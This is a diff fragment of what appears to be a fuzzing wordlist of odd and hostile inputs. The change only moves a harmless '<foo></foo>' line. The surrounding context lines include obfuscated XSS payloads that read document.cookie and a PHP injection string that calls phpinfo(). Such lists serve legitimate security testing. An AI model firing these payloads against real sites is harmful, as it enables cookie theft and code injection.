@@ -1,4 +1,5 @@
 !
+<foo></foo>
 !'
 !@#$%%^#$%#$@#$%$$@#$%^^**(()
 !@#0%^#0##018387@#0^^**(()
@@ -373,7 +374,6 @@ $null
 <IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
 <IMG%20SRC='javasc	ript:alert(document.cookie)'>
 <IMG%20SRC='javascript:alert(document.cookie)'>
-<foo></foo>
 <name>','')); phpinfo(); exit;/*</name>
 <script>alert("XSS")</script>
 <script>alert(document.cookie)</script>
